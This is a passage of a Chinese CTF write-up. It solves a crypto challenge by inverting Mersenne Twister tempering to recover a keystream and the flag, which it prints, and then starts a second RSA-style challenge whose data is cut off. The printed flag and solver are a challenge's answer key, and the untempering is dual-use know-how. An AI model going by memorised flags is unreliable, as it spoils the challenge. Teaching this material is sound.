<h3 id="Radom"><a href="#Radom" class="headerlink" title="Radom"></a><strong>Radom</strong></h3><h4 id="附件：-3"><a href="#附件：-3" class="headerlink" title="附件："></a><strong>附件</strong>：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;????????????&#x27;</span></span><br><span class="line">l = <span class="built_in">len</span>(<span class="built_in">bin</span>(bytes_to_long(flag))[<span class="number">2</span>:])</span><br><span class="line"><span class="keyword">if</span> l % <span class="number">32</span> == <span class="number">0</span>:</span><br><span class="line">    l //= <span class="number">32</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    l = l // <span class="number">32</span> + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">rand = <span class="string">&#x27;&#x27;</span></span><br><span class="line">Rand = []</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">    pro = random.getrandbits(<span class="number">32</span>)</span><br><span class="line">    Rand.append(pro)</span><br><span class="line">    rand += <span class="built_in">bin</span>(pro)[<span class="number">2</span>:].zfill(<span class="number">32</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">s = <span class="built_in">bin</span>(bytes_to_long(flag))[<span class="number">2</span>:].zfill(<span class="built_in">len</span>(rand))</span><br><span class="line">c = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">    c += <span class="built_in">str</span>(<span class="built_in">int</span>(s[i]) ^ <span class="built_in">int</span>(rand[i]))</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span>(<span class="params">number</span>):</span></span><br><span class="line">    number = number ^ (number &gt;&gt; <span class="number">11</span>)</span><br><span class="line">    number = number ^ ((number &lt;&lt; <span class="number">7</span>) &amp; <span class="number">2636928640</span>)</span><br><span class="line">    number = number ^ ((number &lt;&lt; <span class="number">15</span>) &amp; <span class="number">4022730752</span>)</span><br><span class="line">    number = number ^ (number &gt;&gt; <span class="number">18</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> number &amp; <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(Rand)):</span><br><span class="line">    Rand[i] = change(Rand[i])</span><br><span class="line"><span class="built_in">print</span>(Rand)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Rand = [389902299, 3515959351, 2216779731, 2601284435, 514154742, 4172047173, 2921107804, 2217826537, 4248207905, 1322376767]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># c = 01101100010001011100100011111110110000101111000001100001110010001100111000110010111101011111100101011100111011110100001010100111100000010101100011001000011111110111111001010000010000111000101000011111011101001011110001010100100011001010001001111110011111100101111010000010101011100010001111011001010010001010001110001111</span></span><br></pre></td></tr></table></figure>

<h4 id="分析：-3"><a href="#分析：-3" class="headerlink" title="分析："></a><strong>分析</strong>：</h4><h5 id="1）在求解时走了很多弯路，但还是附上笔记："><a href="#1）在求解时走了很多弯路，但还是附上笔记：" class="headerlink" title="1）在求解时走了很多弯路，但还是附上笔记："></a><strong>1）在求解时走了很多弯路，但还是附上笔记：</strong></h5><p>根据队友的指导，在Pychome中下载了Z3包，帮助我求解异或位移方程。z3是一种有效的解方程工具。</p>
<h6 id="学习z3库"><a href="#学习z3库" class="headerlink" title="学习z3库"></a><strong>学习z3库</strong></h6><p>在Python中使用Z3模块，我们的所求结果<strong>一般有以下几种数据类型:</strong></p>
<blockquote>
<p>Int                           #整型<br>Bool                       #布尔型<br>Array                      #数组<br>BitVec ( ‘a’，8 )      #char型</p>
</blockquote>
<p>其中BitVec可以是特定大小的数据类型，不一定是8，例如C语言中的int型可以用BitVec(‘a’,32)表示</p>
<p><strong>设未知数的方法</strong> ：</p>
<p><strong>可以使用 ‘Int’ , ‘Real’ , ‘BitVec’ 等声明一个整数或实数变量，也可以申明一个变量数组</strong></p>
<p><strong>例如</strong>：x = Int(‘x’) #这个int不是c/c++中的那个，而仅仅只代表整数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">y =Real(<span class="string">&#x27;y&#x27;</span>)  				<span class="comment">#实数变量(数学中的那个实数)</span></span><br><span class="line">z =BitVec(<span class="string">&#x27;z&#x27;</span>,<span class="number">8</span>) 			<span class="comment">#char型</span></span><br><span class="line">w =BitVec(<span class="string">&#x27;w&#x27;</span>,<span class="number">32</span>) 			<span class="comment">#int型</span></span><br><span class="line">p =Bool(<span class="string">&#x27;p&#x27;</span>)    			<span class="comment">#定义布尔型</span></span><br></pre></td></tr></table></figure>

<p><strong>初始化序列：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    flag.append(BitVec(<span class="string">&#x27;%d&#x27;</span> % i, <span class="number">8</span>))    <span class="comment">#char型</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#结果为:[0, 1, 2, 3, 4]</span></span><br><span class="line"> </span><br><span class="line">flag= [Int(<span class="string">&#x27;%d&#x27;</span> % i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]    <span class="comment">#初始化为int型</span></span><br><span class="line"> </span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    flag.append(BitVec(<span class="string">&#x27;%d&#x27;</span> % i, <span class="number">32</span>))    <span class="comment">#int型</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#结果为:[0, 1, 2, 3, 4]</span></span><br></pre></td></tr></table></figure>

<h6 id="基本使用语法"><a href="#基本使用语法" class="headerlink" title="基本使用语法"></a><strong>基本使用语法</strong></h6><p><strong>Solver()</strong></p>
<p>Solver()命令会创建一个通用求解器，创建后我们可以添加我们的约束条件，进行下一步的求解</p>
<p><strong>add()</strong></p>
<p>add()命令用来添加约束条件，通常在solver()命令之后，添加的约束条件通常是一个逻辑等式</p>
<p><strong>check()</strong></p>
<p>该函数通常用来判断在添加完约束条件后，来检测解的情况，有解的时候会回显sat，无解的时候会回显unsat </p>
<p><strong>model()</strong></p>
<p>在存在解的时候，该函数会将每个限制条件所对应的解集的交集，进而得出正解。</p>
<p> <strong>常用求解步骤：</strong></p>
<p> 创建约束求解器</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">solver = Solver()</span><br></pre></td></tr></table></figure>

<p>添加约束条件（这一步是z3求解的关键）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">solver.add()</span><br></pre></td></tr></table></figure>

<p>判断解是否存在</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> solver.check() == sat:		<span class="comment"># sat 表示有解 unsat 表示无解</span></span><br></pre></td></tr></table></figure>

<p>求解</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span> ( solver.model() )		<span class="comment">#一般是以 &#x27;约束求解器&#x27;.model() 得到结果，配合 print输出</span></span><br></pre></td></tr></table></figure>

<h6 id="加密过程的实质只有两步："><a href="#加密过程的实质只有两步：" class="headerlink" title="加密过程的实质只有两步："></a><strong>加密过程的实质只有两步：</strong></h6><p>1）产生随机二进制字符串rand。具体做法是：</p>
<p><strong>1.获得l。</strong></p>
<p>将flag字符串转换成long。这里插一个python中byte 与 int 的转换(示例)：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">b = <span class="string">b&#x27;SYC&#x27;</span></span><br><span class="line"><span class="built_in">int</span>.from_bytes(b,byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"><span class="number">5462339</span></span><br><span class="line">x=<span class="number">5462339</span></span><br><span class="line">x.to_bytes(<span class="number">3</span>,byteorder=<span class="string">&#x27;big&#x27;</span>,signed=<span class="literal">False</span>)</span><br><span class="line"><span class="string">b&#x27;SYC&#x27;</span></span><br></pre></td></tr></table></figure>

<p>再由十进制转二进制，计算二进制数的长度，把他赋给l。</p>
<p>然后进行选择操作：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(l%<span class="number">32</span> == <span class="number">0</span>)&#123;</span><br><span class="line"></span><br><span class="line">l =l // <span class="number">32</span> <span class="comment">#//=:整除</span></span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">l = l // <span class="number">32</span> +<span class="number">1</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从后面可以看到，l = 10。</p>
<p>2.产生rand字符串。</p>
<p>for循环重复l次操作：</p>
<p>产生32位（也就是整型，&lt;=2^32-1）的随机数pro，把它添加到Rand数组中。然后，把pro转换为二进制字符串，对其进行zfill(32)操作：</p>
<p>原字符串右对齐，前面填充0，得到32位长度的字符串。</p>
<p>添加到空字符串rand后面。</p>
<p>所以，最后得到的Rand数组有10个元素，而rand字符串就是长度为10*32=320的二进制字符串。</p>
<p><strong>2）加密。具体做法是：</strong></p>
<p><strong>1.对Rand数组中的每个元素进行change函数的变换。</strong>变换过程是：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span>(<span class="params">number</span>):</span></span><br><span class="line">    number = number ^ (number &gt;&gt; <span class="number">11</span>)</span><br><span class="line">    number = number ^ ((number &lt;&lt; <span class="number">7</span>) &amp; <span class="number">2636928640</span>)</span><br><span class="line">    number = number ^ ((number &lt;&lt; <span class="number">15</span>) &amp; <span class="number">4022730752</span>)</span><br><span class="line">    number = number ^ (number &gt;&gt; <span class="number">18</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> number &amp; <span class="number">0xffffffff</span></span><br></pre></td></tr></table></figure>

<p>最终得到的就是题目下方的Rand数组，以及其中的10个数。这个数组对解题非常关键！</p>
<p><strong>2.加密。</strong>将flag字符串转换成long,再由十进制转二进制。进行zfill操作（还记得是怎么做的吗？）得到和rand的长度相等（=320）的二进制字符串s。这样，含有flag的字符串s就和含有随机数的字符串rand长度相等了。</p>
<p>对字符串中相同位置(s[i],rand[i])的二进制数字进行异或^运算，所得到的二进制数字添加到空字符串c的后面，所得到的c就是密文了。</p>
<img src="https://static01.imgkr.com/temp/5fd45478b4aa44639f331768c91a83ff.png" style="zoom:25%;" />

<h6 id="这张图是上面文字的流程图版，结合起来就能理解它的加密原理了。"><a href="#这张图是上面文字的流程图版，结合起来就能理解它的加密原理了。" class="headerlink" title="这张图是上面文字的流程图版，结合起来就能理解它的加密原理了。"></a><strong>这张图是上面文字的流程图版，结合起来就能理解它的加密原理了。</strong></h6><p>现在手头有的条件有三个：加密原理、含有随机数（密钥）的数组Rand、密文c</p>
<p>理解了加密原理,解密的思路就很清晰了：</p>
<p>1）既然知道Rand中的随机数变换法则和最终结果，那就可以通过解方程来反求随机数pro。将pro转换为二进制，zfill操作后依次连接起来，就可以得到二进制字符串rand。又根据异或的特殊性质：</p>
<h6 id="a-b-b-a"><a href="#a-b-b-a" class="headerlink" title="a^b^b = a"></a><strong>a^b^b = a</strong></h6><p>c是由rand和s异或得到的，那么再把c和rand异或就能得到s。有了s，自然就有flag了。</p>
<h6 id="遇到问题"><a href="#遇到问题" class="headerlink" title="遇到问题"></a><strong>遇到问题</strong></h6><p>我编写了求解pro的方程：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span>(<span class="params">number</span>):</span> <span class="comment">#这里和加密过程一样</span></span><br><span class="line">    number = number ^ (number &gt;&gt; <span class="number">11</span>)</span><br><span class="line">    number = number ^ ((number &lt;&lt; <span class="number">7</span>) &amp; <span class="number">2636928640</span>)</span><br><span class="line">    number = number ^ ((number &lt;&lt; <span class="number">15</span>) &amp; <span class="number">4022730752</span>)</span><br><span class="line">    number = number ^ (number &gt;&gt; <span class="number">18</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> number &amp; <span class="number">0xffffffff</span></span><br><span class="line">number = BitVec(<span class="string">&#x27;number&#x27;</span>,<span class="number">32</span>)</span><br><span class="line">solver = Solver()</span><br><span class="line">solver.add(change(number) == <span class="number">389902299</span>) <span class="comment">#这里列方程</span></span><br><span class="line"><span class="keyword">if</span> solver.check() == sat: <span class="comment">#判断是否有解</span></span><br><span class="line">    <span class="built_in">print</span>(solver.model())</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;WA&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>代入第一个数据389902299，成功得到第一个pro:[number = 587391287]</p>
<p>但代入第二个、第三个……最后一个数据，全都无解！</p>
<h5 id="2）正确的解法"><a href="#2）正确的解法" class="headerlink" title="2）正确的解法"></a><strong>2）正确的解法</strong></h5><p><strong>引例：</strong>shift = 3，length = 8</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">number = <span class="string">&#x27;11010010&#x27;</span></span><br><span class="line">value = <span class="built_in">int</span>(number,<span class="number">2</span>)</span><br><span class="line">shifted = value&gt;&gt;<span class="number">3</span></span><br><span class="line">result = value^shifted</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;value:&quot;</span>+<span class="built_in">bin</span>(value))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;shifted:&quot;</span>+<span class="built_in">bin</span>(shifted))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;result:&quot;</span>+<span class="built_in">bin</span>(result))</span><br><span class="line"></span><br><span class="line">value:  <span class="number">0b11010010</span></span><br><span class="line">shifted:<span class="number">0b00011010</span></span><br><span class="line">result: <span class="number">0b11001000</span></span><br></pre></td></tr></table></figure>

<p>观察结果，不难发现，result的前shift位和value的前shift位是相同的。这是因为异或时shifted的前shift位全部是0。因此我们能得到mask满足前shift位和value相同，后面全为0</p>
<p>该怎么得到这个数呢？根据逻辑运算符的法则，当result与一个前shift位为1，后面全为0的数做&amp;按位与运算（这个数记作p），就能得到mask(前提是二者长度相等)。其中p是由0xffffffff&lt;&lt;(length-shift)来的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">result = <span class="built_in">int</span>(<span class="string">&#x27;11001000&#x27;</span>,<span class="number">2</span>)</span><br><span class="line">p = <span class="built_in">int</span>(<span class="string">&#x27;11100000&#x27;</span>,<span class="number">2</span>)</span><br><span class="line">mask = result&amp;p</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bin</span>(mask))</span><br><span class="line"></span><br><span class="line"><span class="number">0b11000000</span></span><br></pre></td></tr></table></figure>

<p>有了value的前shift位数mask，根据移位规则，就能得到shifted的前2 * shift位(记作mask2)，又由异或规则,value的前2*shift位value1就等于</p>
<p>value1 = mask2^result</p>
<p>重复循环知道n次shift的值&gt;=length,此时得到的数就是原来的值value了！</p>
<h4 id="这张图是上面文字的形象表示，结合起来就能理解解密过程了"><a href="#这张图是上面文字的形象表示，结合起来就能理解解密过程了" class="headerlink" title="这张图是上面文字的形象表示，结合起来就能理解解密过程了"></a><strong>这张图是上面文字的形象表示，结合起来就能理解解密过程了</strong></h4><img src="https://static01.imgkr.com/temp/9c0a684f77ed4a1387fd36b09cb71c3a.png" style="zoom: 25%;" />

<p>根据相同的道理，可以推导出左移时候的情况。结合在一起，就能编写出最终的解密代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inverse_right_shift_xor</span>(<span class="params">value, shift</span>):</span> <span class="comment">#右移逆向</span></span><br><span class="line">    i, result = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i * shift &lt; <span class="number">32</span>:</span><br><span class="line">        part_mask = (<span class="number">0xffffffff</span> &lt;&lt; (<span class="number">32</span> - shift)) &gt;&gt; (i * shift)</span><br><span class="line">        part = value &amp; part_mask</span><br><span class="line">        value ^= part &gt;&gt; shift</span><br><span class="line">        result ^= part</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">left</span>(<span class="params">value, shift, mask</span>):</span> <span class="comment">#左移逆向</span></span><br><span class="line">        i, result = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> i * shift &lt; <span class="number">32</span>:</span><br><span class="line">            part_mask = (<span class="number">0xffffffff</span>&gt;&gt; (<span class="number">32</span> - shift)) &lt;&lt; (i * shift)</span><br><span class="line">            part = value &amp; part_mask</span><br><span class="line">            value ^= (part &lt;&lt; shift) &amp; mask</span><br><span class="line">            result ^= part</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">Rand = [<span class="number">389902299</span>, <span class="number">3515959351</span>, <span class="number">2216779731</span>, <span class="number">2601284435</span>, <span class="number">514154742</span>, <span class="number">4172047173</span>, <span class="number">2921107804</span>, <span class="number">2217826537</span>, <span class="number">4248207905</span>, <span class="number">1322376767</span>]</span><br><span class="line">rand=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(Rand)) : <span class="comment">#求解pro,并得到rand</span></span><br><span class="line">    a = Rand[i]</span><br><span class="line">    b = inverse_right_shift_xor(a, <span class="number">18</span>)</span><br><span class="line">    c = left(b, <span class="number">15</span>, <span class="number">4022730752</span>)</span><br><span class="line">    d = left(c, <span class="number">7</span>, <span class="number">2636928640</span>)</span><br><span class="line">    e = inverse_right_shift_xor(d, <span class="number">11</span>)</span><br><span class="line">    rand += <span class="built_in">bin</span>(e)[<span class="number">2</span>:].zfill(<span class="number">32</span>)</span><br><span class="line">c = <span class="string">&#x27;01101100010001011100100011111110110000101111000001100001110010001100111000110010111101011111100101011100111011110100001010100111100000010101100011001000011111110111111001010000010000111000101000011111011101001011110001010100100011001010001001111110011111100101111010000010101011100010001111011001010010001010001110001111&#x27;</span></span><br><span class="line">s = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(rand)): <span class="comment">#异或是可逆的，得到s</span></span><br><span class="line">    s += <span class="built_in">str</span>(<span class="built_in">int</span>(c[i]) ^ <span class="built_in">int</span>(rand[i]))</span><br><span class="line">s = <span class="string">&#x27;1010011010110010100001101111011001100010111001100101101011100100110000101101110011001000011000001101101001011010110111101110010001011010110111001101111011101000010110101010100011010000110000101110100001011010110100100110101001011010110000100101101011100010111010100110011011100110111010001101001011011110110111001111101&#x27;</span></span><br><span class="line">x = <span class="built_in">int</span>(s,<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(x)</span><br><span class="line"></span><br><span class="line"><span class="number">695436377387756659207326273798451770608388670144120223799296234200392681042739248103523814960765</span></span><br></pre></td></tr></table></figure>

<p>最终得到的x用long_to_bytes，得到SYC{1s-rand0m-or-not-That-i5-a-qu3stion}</p>
<p>松本眞、西村拓士，我是你们的破壁人！！！</p>
<h3 id="step-by-step"><a href="#step-by-step" class="headerlink" title="step by step"></a><strong>step by step</strong></h3><h4 id="附件：-4"><a href="#附件：-4" class="headerlink" title="附件："></a><strong>附件：</strong></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, bytes_to_long, long_to_bytes</span><br><span class="line"><span class="keyword">import</span> gmpy2 <span class="keyword">as</span> gp</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line">flag = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">100</span>)</span><br><span class="line">q = getPrime(<span class="number">100</span>)</span><br><span class="line">n = p * q</span><br><span class="line">clist = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">bin</span>(flag)[<span class="number">2</span>:]:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        x = random.randint(<span class="number">1</span>, n)</span><br><span class="line">        <span class="keyword">if</span> gp.gcd(x, n) == <span class="number">1</span>:</span><br><span class="line">            c = (<span class="built_in">pow</span>(<span class="number">3</span>, <span class="built_in">int</span>(i) + x * <span class="number">2</span>, n) * x**<span class="number">2</span>) % n</span><br><span class="line">            clist.append(c)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(clist)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">1254676922968308054473282588201432441748387886551758353389559</span></span><br><span class="line"><span class="string">[112490766735794793494258589897687977797993914062877995369853, 423825989606899409733986824741778284626898537704684650054048, 1239912440099782777043012567198356769914426423982980091061342, 1078272043845620437375344423460688188703277391763226546180151, 159286594418951337823608883690981934876156746053051292254402, 189434397083734065502133592439774066008070864031834709620441, 264105932521685455831442874483122006851812174082486446496525, 252479590298382195780257510632414277760400686563367629394825, 34602153293813328946647556336715300088648653636913843351330, 808692976248223555967993480457680585654329233137701900525232, 836623390705731389723338030121423143060093415003999783847569, 1218829648463542488706300570862499177531816513847669694517865, 571795296699927140597629733281737316938588378300113684751321, 324408602401500017634991400429058861929441907523133040616718, 652309276856121062936275131393396513436481452168222192943617, 135368324264829776566203256490111602190045577103623626459391, 677807894471260530035795635544578014296111908610448488780236, 1135708831589387209825610411788217272141435421502826225558333, 196882176169680492388044653063809988445336200851553236565493, 1130705847039352086713022625138307016610235729598245321418537, 974627899979016730650505688458957247745733629797568884460037, 948987355716018600108888773982169186615279073844787201014331, 364200727831752453880724784142441918092136276002472196567297, 811786724825671349602848333002825903390189436235744947667153, 248544601758659627780643527412918707686666534454807514221527, 1078860601713092925823762998344218082511712606733279204236487, 634851505432770176888905188832078431577879067601938324607512, 232972021265122845242665536151391828176473610240017058444456, 1080796896535347345799923528377657622102130648424673730618155, 622059452832122796944248249707923610120342427983134655552340, 837257289852652447556360719449396492271622453092839975184158, 626327369687614106133688347844033161113612134573404258486630, 1233019194503373412608053469954621323121044455057773900406773, 912564467902216938034173803480737819092198560216579817988291, 408076399689155479697691914877522087726703540593136498587215, 1118745562641959211267518507476218888452509349041078337285098, 1103228775032586830415033772993541541820163005491285279882940, 680899077364553221002722115625274809744677788062477442312086, 355349436487753936000721704075588637048102593449252106813298, 5254361838244723184679801326407268664182654715017847086461, 480145671282471097574354032682584083826945502763658946101104, 249136810947175342894562520096603076879372702701088690594445, 175216547555975039599856545426098941943382367602172941744494, 436310864447848960706296122266108102033486860525693191197797, 342620466614509535208918527767209905005823047382938223113086, 369848992268737575958936185907214270590887322936419642815242, 278575045025661827978388874494219837629182438978526195181637, 1189171180780533071473125545247289861677955100195126109964590, 256190182678715266654387215899616014762531664768736561586327, 719160215933023695898776016718481385742508618676368640641809, 147033122794177086112261858085593706727904275426698884436011, 247466503394960387825735598976068779045757078494832316444804, 787155643450160361724955357286670519256662665704845721250609, 112101120505278148126370035869523081506090979629681063614381, 890009544685851814191758439205974159586245412054287515881584, 1168625756997945588141764967298286550498540363325170551587334, 946031342434770434479581499217378781992921204179509449159996, 759124753621557368233069144948668001126536400499520990700641, 930584421635842804698880452391670787414151645249729141739148, 140981825203074314092967178062754008486703246602401550271041, 880126454149733441805446179826584472107299085899567279467558, 510129631452465708304688340114214360026947205003705062663759, 857274757020001316639221394675820731579775247610619594760511, 444486969413575687285961819261097401974268741167841964919716, 645830958128126799221416466698967430939726760487764050203821, 128864469762235652994228226148325614187747349331618451490354, 732913002124581119538173953534485652651112140400076340646452, 1245672039639609341331477592944058028011275464117654972595670, 1160765030758624190775369713232721901616189349905945190302338, 745734132091942990384796294800038299023052878196943617322617, 34973161572808799782240527358912894045293050940490682156733, 507586651070816931641904112686082840821460472219390068396982, 359195216122538975934588740641220005777478961423841727365432, 60506687352654743312206686911057762445232526009857863834444, 402036521271253699065227780662896890228371046068283711170220, 465427226677337673103293964961886503610313835775181975449721, 925246962888172144515172444374190859841851825972285013006527, 542176614893876361668218387162168517498644799220587472896002, 852215132196560596695876248813488364201491362280912035912061, 945548964927065532651141821562204387565145712002346337639711, 736943822066388892909878515650831955490636214039062998720510, 766357526983761241394182000478355475617711906398422036954152, 77156525593382594092608158744099524034892127423492520631820, 562562817542804973601572838378263130638457829485887327130286, 768093992370198202822524520006977816845162154854939167515517, 1099957424762490943973557935337350760135180754563993547358098, 698816668614997174913438496891169625976027534942525487303513, 417641699919584202170293946436276552973997395211792288687960, 